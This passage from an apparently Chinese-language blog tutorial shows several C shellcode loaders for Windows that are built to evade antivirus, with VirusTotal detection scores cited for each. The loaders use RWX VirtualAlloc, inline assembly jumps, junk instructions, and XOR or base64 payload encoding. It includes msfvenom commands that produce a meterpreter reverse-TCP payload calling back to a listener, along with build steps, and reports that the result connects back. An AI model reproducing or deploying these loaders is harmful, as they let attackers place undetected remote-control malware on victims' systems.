3333</code></pre><h4 id="2-申请动态内存加载（VT-26-69，过360）"><a href="#2-申请动态内存加载（VT-26-69，过360）" class="headerlink" title="2.申请动态内存加载（VT:26/69，过360）"></a>2.申请动态内存加载（VT:26/69，过360）</h4><p>下面的代码会申请一段动态内存，然后加载shellcode。</p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;Windows.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><span class="hljs-meta">#</span><span class="bash">pragma comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) //windows控制台程序不出黑窗口</span>unsigned char buf[] =&quot;shellcode&quot;;main()&#123;    char *Memory;    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, buf, sizeof(buf));    ((void(*)())Memory)();&#125;</code></pre><p>操作和方法一一样。</p><h4 id="3-嵌入汇编加载（VT-23-70-）"><a href="#3-嵌入汇编加载（VT-23-70-）" class="headerlink" title="3.嵌入汇编加载（VT:23/70 ）"></a>3.嵌入汇编加载（VT:23/70 ）</h4><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;windows.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><span class="hljs-meta">#</span><span class="bash">pragma comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>)</span>unsigned char shellcode[] =&quot;&quot;;void main()&#123;        __asm    &#123;        mov eax, offset shellcode        jmp eax    &#125;&#125;</code></pre><h4 id="4-强制类型转换"><a href="#4-强制类型转换" class="headerlink" title="4.强制类型转换"></a>4.强制类型转换</h4><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/section:.data,RWE&quot;</span>)</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;   ((<span class="hljs-keyword">void</span>(WINAPI*)(<span class="hljs-keyword">void</span>))&amp;buf)();&#125;</code></pre><h4 id="5-汇编花指令"><a href="#5-汇编花指令" class="headerlink" title="5.汇编花指令"></a>5.汇编花指令</h4><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/section:.data,RWE&quot;</span>)</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;        __asm    &#123;        mov eax, offset shellcode        _emit <span class="hljs-number">0xFF</span>          _emit <span class="hljs-number">0xE0</span>    &#125;&#125;</code></pre><h4 id="6-XOR加密-VT-23-70"><a href="#6-XOR加密-VT-23-70" class="headerlink" title="6.XOR加密(VT:23/70 )"></a>6.XOR加密(VT:23/70 )</h4><p>msf生成raw格式的shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</code></pre><p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>/root/shellcode.raw</code>为msf生成的raw文件，<code>se_nell</code>为自己设置的key。</p><pre><code class="hljs shell">python shellcode_encoder.py -cpp /root/shellcode.raw se_null xor</code></pre><p>在vs2019中将上述几个实验的源码打开，源文件下的test.c改为test.cpp，粘贴<code>ShellcodeWrapper</code>生成的cpp文件，位置在<code>ShellcodeWrapper/ShellcodeWrapper/result/</code>下，debug生成project，执行即可，msf可上线，但是会出现弹窗。（注意生成的cpp文件第一行<code>#include &quot;stdafx.h&quot;</code>删除再生成project文件。）</p><h4 id="7-base64加密法"><a href="#7-base64加密法" class="headerlink" title="7.base64加密法"></a>7.base64加密法</h4><p><strong>方法一</strong></p><p>msf生成base64编码的shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.3.30 lport=3333  -f c &gt; shell.c</code></pre><p>将<code>shell.c</code>的内容复制到一下文件中，命名为<code>shellcode.c</code></p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;Windows.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">&quot;base64.h&quot;</span></span>unsigned char buf[] =&quot;msf base64 code here&quot;;int main(int argc, const char * argv[]) &#123;    char str1[1000] = &#123; 0 &#125;;    Base64decode(str1, buf);    //printf(&quot;%d  &quot;, sizeof(str3));    char *Memory;    Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    memcpy(Memory, str1, sizeof(str1));    ((void(*)())Memory)();    return 0;&#125;</code></pre><p>另外需准备base64.c文件，内容如下</p><pre><code class="hljs shell">/* Base64 encoder/decoder. Originally Apache file ap_base64.c*/<span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">&quot;base64.h&quot;</span></span>/* aaaack but it&#x27;s fast and const should make it shared text page. */static const unsigned char pr2six[256] =&#123;    /* ASCII table */    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64&#125;;int Base64decode_len(const char *bufcoded)&#123;    int nbytesdecoded;    register const unsigned char *bufin;    register int nprbytes;    bufin = (const unsigned char *)bufcoded;    while (pr2six[*(bufin++)] &lt;= 63);    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;    nbytesdecoded = ((nprbytes + 3) / 4) * 3;    return nbytesdecoded + 1;&#125;int Base64decode(char *bufplain, const char *bufcoded)&#123;    int nbytesdecoded;    register const unsigned char *bufin;    register unsigned char *bufout;    register int nprbytes;    bufin = (const unsigned char *)bufcoded;    while (pr2six[*(bufin++)] &lt;= 63);    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;    nbytesdecoded = ((nprbytes + 3) / 4) * 3;    bufout = (unsigned char *)bufplain;    bufin = (const unsigned char *)bufcoded;    while (nprbytes &gt; 4) &#123;        *(bufout++) =            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);        *(bufout++) =            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);        *(bufout++) =            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);        bufin += 4;        nprbytes -= 4;    &#125;    /* Note: (nprbytes == 1) would be an error, so just ingore that case */    if (nprbytes &gt; 1) &#123;        *(bufout++) =            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);    &#125;    if (nprbytes &gt; 2) &#123;        *(bufout++) =            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);    &#125;    if (nprbytes &gt; 3) &#123;        *(bufout++) =            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);    &#125;    *(bufout++) = &#x27;\0&#x27;;    nbytesdecoded -= (4 - nprbytes) &amp; 3;    return nbytesdecoded;&#125;static const char basis_64[] =&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;int Base64encode_len(int len)&#123;    return ((len + 2) / 3 * 4) + 1;&#125;int Base64encode(char *encoded, const char *string, int len)&#123;    int i;    char *p;    p = encoded;    for (i = 0; i &lt; len - 2; i += 3) &#123;        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];        *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];        *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];        *p++ = basis_64[string[i + 2] &amp; 0x3F];    &#125;    if (i &lt; len) &#123;        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];        if (i == (len - 1)) &#123;            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];            //    *p++ = &#x27;=&#x27;;        &#125;        else &#123;            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];            *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];        &#125;        //*p++ = &#x27;=&#x27;;    &#125;    *p++ = &#x27;\0&#x27;;    return p - encoded;&#125;</code></pre><p><code>base64.h</code>文件内容</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _BASE64_H_</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _BASE64_H_</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64encode_len</span><span class="hljs-params">(<span class="hljs-keyword">int</span> len)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64encode</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * coded_dst, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *plain_src, <span class="hljs-keyword">int</span> len_plain_src)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64decode_len</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * coded_src)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64decode</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * plain_dst, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *coded_src)</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span>&#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//_BASE64_H_</span></span></code></pre><p>使用gcc进行编译</p><pre><code class="hljs shell">gcc shellcode.c base64.c -o test.exe</code></pre><p>执行exe可正常上线</p><p><strong>方法二</strong></p><p>与方法一略有不同</p><p>base64.c</p><pre><code class="hljs angelscript"><span class="hljs-comment">//</span><span class="hljs-comment">//  base64.c</span><span class="hljs-comment">//  base64</span><span class="hljs-comment">//</span><span class="hljs-comment">//  Created by guofu on 2017/5/25.</span><span class="hljs-comment">//  Copyright © 2017年 guofu. All rights reserved.</span><span class="hljs-comment">//</span><span class="hljs-comment">/**</span><span class="hljs-comment">*  转解码过程</span><span class="hljs-comment">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span><span class="hljs-comment">*  先将要编码的转成对应的ASCII值</span><span class="hljs-comment">*  如编码: s 1 3</span><span class="hljs-comment">*  对应ASCII值为: 115 49 51</span><span class="hljs-comment">*  对应二进制为: 01110011 00110001 00110011</span><span class="hljs-comment">*  将其6个分组分4组: 011100 110011 000100 110011</span><span class="hljs-comment">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span><span class="hljs-comment">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span><span class="hljs-comment">*  查找base64 转换表 对应 c z E z</span><span class="hljs-comment">*</span><span class="hljs-comment">*  解码</span><span class="hljs-comment">*  c z E z</span><span class="hljs-comment">*  对应ASCII值为 99 122 69 122</span><span class="hljs-comment">*  对应表base64_suffix_map的值为 28 51 4 51</span><span class="hljs-comment">*  对应二进制值为 00011100 00110011 00000100 00110011</span><span class="hljs-comment">*  依次去除每组的前两位, 再拼接成3字节</span><span class="hljs-comment">*  即: 01110011 00110001 00110011</span><span class="hljs-comment">*  对应的就是s 1 3</span><span class="hljs-comment">*/</span>#include <span class="hljs-string">&quot;base64.h&quot;</span>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;<span class="hljs-comment">// base64 转换表, 共64个</span>static <span class="hljs-keyword">const</span> char base64_alphabet[] = &#123;    <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>,    <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>,    <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>,    <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>,    <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>,    <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>,    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>,    <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,    <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>,    <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span> &#125;;<span class="hljs-comment">// 解码时使用</span>static <span class="hljs-keyword">const</span> unsigned char base64_suffix_map[<span class="hljs-number">256</span>] = &#123;    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">253</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">253</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">253</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,  <span class="hljs-number">62</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,  <span class="hljs-number">63</span>,    <span class="hljs-number">52</span>,  <span class="hljs-number">53</span>,  <span class="hljs-number">54</span>,  <span class="hljs-number">55</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">57</span>,  <span class="hljs-number">58</span>,  <span class="hljs-number">59</span>,  <span class="hljs-number">60</span>,  <span class="hljs-number">61</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">254</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">6</span>,    <span class="hljs-number">7</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">10</span>,  <span class="hljs-number">11</span>,  <span class="hljs-number">12</span>,  <span class="hljs-number">13</span>,  <span class="hljs-number">14</span>,  <span class="hljs-number">15</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">17</span>,  <span class="hljs-number">18</span>,    <span class="hljs-number">19</span>,  <span class="hljs-number">20</span>,  <span class="hljs-number">21</span>,  <span class="hljs-number">22</span>,  <span class="hljs-number">23</span>,  <span class="hljs-number">24</span>,  <span class="hljs-number">25</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>,  <span class="hljs-number">26</span>,  <span class="hljs-number">27</span>,  <span class="hljs-number">28</span>,  <span class="hljs-number">29</span>,  <span class="hljs-number">30</span>,  <span class="hljs-number">31</span>,  <span class="hljs-number">32</span>,  <span class="hljs-number">33</span>,  <span class="hljs-number">34</span>,  <span class="hljs-number">35</span>,  <span class="hljs-number">36</span>,    <span class="hljs-number">37</span>,  <span class="hljs-number">38</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">40</span>,  <span class="hljs-number">41</span>,  <span class="hljs-number">42</span>,  <span class="hljs-number">43</span>,  <span class="hljs-number">44</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">46</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">48</span>,    <span class="hljs-number">49</span>,  <span class="hljs-number">50</span>,  <span class="hljs-number">51</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span> &#125;;static char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) &#123;    src &lt;&lt;= lnum; <span class="hljs-comment">// src = src &lt;&lt; lnum;</span>    src &gt;&gt;= rnum; <span class="hljs-comment">// src = src &gt;&gt; rnum;</span>    <span class="hljs-keyword">return</span> src;&#125;<span class="hljs-built_in">int</span> base64_encode(<span class="hljs-keyword">const</span> char *indata, <span class="hljs-built_in">int</span> inlen, char *outdata, <span class="hljs-built_in">int</span> *outlen) &#123;    <span class="hljs-built_in">int</span> ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// return value</span>    <span class="hljs-keyword">if</span> (indata == NULL || inlen == <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> ret = <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">int</span> in_len = <span class="hljs-number">0</span>; <span class="hljs-comment">// 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span>    <span class="hljs-built_in">int</span> pad_num = <span class="hljs-number">0</span>; <span class="hljs-comment">// 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span>    <span class="hljs-keyword">if</span> (inlen % <span class="hljs-number">3</span> != <span class="hljs-number">0</span>) &#123;        pad_num = <span class="hljs-number">3</span> - inlen % <span class="hljs-number">3</span>;    &#125;    in_len = inlen + pad_num; <span class="hljs-comment">// 拼接后的长度, 实际编码需要的长度(3的倍数)</span>    <span class="hljs-built_in">int</span> out_len = in_len * <span class="hljs-number">8</span> / <span class="hljs-number">6</span>; <span class="hljs-comment">// 编码后的长度</span>    char *p = outdata; <span class="hljs-comment">// 定义指针指向传出data的首地址</span>                       <span class="hljs-comment">//编码, 长度为调整后的长度, 3字节一组</span>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; in_len; i += <span class="hljs-number">3</span>) &#123;        <span class="hljs-built_in">int</span> value = *indata &gt;&gt; <span class="hljs-number">2</span>; <span class="hljs-comment">// 将indata第一个字符向右移动2bit(丢弃2bit)</span>        char c = base64_alphabet[value]; <span class="hljs-comment">// 对应base64转换表的字符</span>        *p = c; <span class="hljs-comment">// 将对应字符(编码后字符)赋值给outdata第一字节</span>                <span class="hljs-comment">//处理最后一组(最后3字节)的数据</span>        <span class="hljs-keyword">if</span> (i == inlen + pad_num - <span class="hljs-number">3</span> &amp;&amp; pad_num != <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">if</span> (pad_num == <span class="hljs-number">1</span>) &#123;                *(p + <span class="hljs-number">1</span>) = base64_alphabet[(<span class="hljs-built_in">int</span>)(cmove_bits(*indata, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>) + cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">0</span>, <span class="hljs-number">4</span>))];                *(p + <span class="hljs-number">2</span>) = base64_alphabet[(<span class="hljs-built_in">int</span>)cmove_bits(*(indata + <span class="hljs-number">1</span>), <span class="hljs-number">4</span>, <span class="hljs-number">2</span>)];                *(p + <span class="hljs-number">3</span>) = <span class="hljs-string">&#x27;=&#x27;</span>;            &#125;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pad_num == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// 编码后的数据要补两个 &#x27;=&#x27;</span>                *(p + <span class="hljs-number">1</span>) = base64_alphabet[(<span class="hljs-built_in">int</span>)cmove_bits(*indata, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>)];                *(p + <span class="hljs-number">2</span>) = <span class="hljs-string">&#x27;=&#x27;</span>;                *(p + <span class="hljs-number">3</span>) = <span class="hljs-string">&#x27;=&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 处理正常的3字节的数据</span>            *(p + <span class="hljs-number">1</span>) = base64_alphabet[cmove_bits(*indata, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>) + 